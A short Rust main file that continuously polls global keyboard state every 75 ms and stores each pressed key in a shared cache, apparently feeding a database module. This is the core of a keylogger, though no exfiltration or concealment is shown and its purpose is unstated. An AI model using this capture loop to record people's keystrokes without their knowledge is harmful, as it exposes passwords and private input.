use std::{thread, time};

use device_query::{DeviceQuery, DeviceState, Keycode};

use crate::ram::clear_cache::clear_ram_thread;
use crate::ram::SAFE_PUB_VAR;

mod ram;
pub mod db;

fn main() {
    thread::spawn(|| { clear_ram_thread() });
    loop {
        let device_state = DeviceState::new();
        let keys: Vec<Keycode> = device_state.get_keys();
        for key_pressed in keys {
            SAFE_PUB_VAR.lock().expect("todo").key_pressed_cache.push(key_pressed.to_string());
        }
        thread::sleep(time::Duration::from_millis(75))
    }
}
// Rochac
